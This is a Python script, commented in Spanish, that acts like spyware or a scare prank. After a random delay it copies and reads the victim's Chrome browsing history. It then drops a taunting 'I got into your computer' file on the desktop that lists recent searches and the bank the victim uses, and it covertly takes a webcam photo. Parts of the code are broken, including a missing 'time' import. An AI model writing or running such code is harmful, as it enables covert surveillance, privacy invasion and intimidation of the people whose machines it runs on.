import re
import os
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3
import glob
from shutil import copyfile
import cv2
import getpass
import os


HACKER_PATH_NAME = "PARA VOS.txt"
MENSAJE = "Hola, entré a tu computadora.\n\n"


def get_user_path():
    return "{}".format(Path.home())


def retrasar_programa():
    n_hours = randrange(1, 4)
    n_min = randrange(00, 60)
    print("Me ejecutare en {} seg".format(n_hours))
    sleep(n_hours)  # * n_min * 60


def crear_archivo(user_path):
    archivo_hacker = open(user_path + "/Desktop/" + HACKER_PATH_NAME, "w", encoding="utf-8")
    archivo_hacker.write(MENSAJE)
    return archivo_hacker


def obtener_historial_chrome(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_historial = history_path + "temp"
            copyfile(history_path, temp_historial)
            connection = sqlite3.connect(temp_historial)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 seg")
            sleep(3)


def check_chrome_history(archivo_hacker, historial_chrome):
    # Filtra la lista
    archivo_hacker.write("Veo que tus ultimas busquedas fueron...\n\n")
    for item in historial_chrome[:8]:
        archivo_hacker.write("- {}\n\n".format(item[0]))


def check_twitter_profiles(archivo_hacker, historial_chrome):
    try:
        perfiles_visitados = []
        for item in historial_chrome:
            item[2]
            results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
            if results:
                perfiles_visitados.append(results[0])
        archivo_hacker.write("Además estuviste viendo estos perfiles en Twitter {}...\n\n".format(
            ", ".join(perfiles_visitados)))
    except Exception:
        return None


def check_youtube_profiles(archivo_hacker, historial_chrome):
    try:
        perfiles_visitados = []
        for item in historial_chrome:
            item[2]
            results = re.findall("https://www.youtube.com/(@[A-Za-z0-9]+)$", item[2])
            if results:
                results_sin_arroba = results[0][1:]
                perfiles_visitados.append(results_sin_arroba)
        archivo_hacker.write("Tambien me di cuenta que te gusta Youtube, estos son los ultimos canales que visitaste:"
                             " {}\n\n".format(", ".join(perfiles_visitados)))
    except Exception:
        return None


def check_steam_games(archivo_hacker):
    try:
        steam_path = "D:\\Steam\\steamapps\\common\\*"
        games = []
        games_paths = glob.glob(steam_path)
        games_paths.sort(key=os.path.getmtime, reverse=True)
        for game_path in games_paths:
            games.append(game_path.split("\\")[-1])

        archivo_hacker.write("Y por ultimo parece ser que estos son tus juegos favoritos {}\n\n"
                             .format(", ".join(games[:4])))
    except Exception:
        return None


def check_bank(archivo_hacker, historial_chrome):
    try:
        lista_bancos = ["Galicia", "Santander", "BBVA", "Patagonia", "Supervielle", "Credicoop", "Itau"]

        for bancos_en_lista in lista_bancos:
            for bancos_en_chrome in historial_chrome:
                if bancos_en_lista in bancos_en_chrome[0]:
                    archivo_hacker.write("Ah, tambien se que tu dinero lo guardas en el banco {}"
                                         .format(bancos_en_lista))
                    exit()
    except Exception:
        return None


def send_text_and_file(archivo_hacker):
    time.sleep(2)

    getUser = getpass.getuser()
    save = 'C:\\Users\\' + getUser

    TITLE = "IMAGEN DEL BOLUDO"
    FILE = "user.png"

    # Elige la camara y saca foto
    camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)

    time.sleep(1)

    # Lee la foto sacada
    return_value, image = camera.read()
    # Escribe en el disco la foto
    cv2.imwrite(os.path.join(save, FILE), image)
    # Elimina la sesion de la camara
    del camera

    time.sleep(1)

    archivo_hacker.write(image)


def main():
    # Esperamos x tiempo para que el programa se ejecute
    retrasar_programa()

    # Obtenemos la ruta del usuario de Windows
    user_path = get_user_path()

    # Obtenemos el historial de Google, cuando se pueda
    historial_chrome = obtener_historial_chrome(user_path)

    # Creamos el archivo en la ruta
    archivo_hacker = crear_archivo(user_path)

    # Escribiendo mensajes
    check_chrome_history(archivo_hacker, historial_chrome)
    # check_youtube_profiles(archivo_hacker, historial_chrome)
    # check_twitter_profiles(archivo_hacker, historial_chrome)
    # check_steam_games(archivo_hacker)
    check_bank(archivo_hacker, historial_chrome)
    send_text_and_file(archivo_hacker)


if __name__ == '__main__':
    main()
